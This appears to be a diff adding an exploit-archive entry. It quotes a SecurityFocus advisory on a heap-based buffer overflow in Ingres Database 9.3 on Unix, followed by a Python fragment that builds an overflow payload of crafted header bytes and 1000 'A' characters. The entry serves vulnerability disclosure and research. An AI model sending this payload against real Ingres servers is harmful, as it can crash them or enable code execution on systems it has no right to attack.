@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/38001/info
+
+Ingres Database is prone to a heap-based buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.
+
+Attackers can exploit this issue to execute arbitrary code with the privileges of the application or crash the affected application.
+
+Ingres Database 9.3 on Unix is vulnerable; other versions may also be affected.
+
+s = "\x00\x00\x00\x00"
+s += "\xff\xff\xff\xff"
+s += "\x3c\x00\x00\x00\x06\x00\x00\x00"
+s += "A" * 1000 
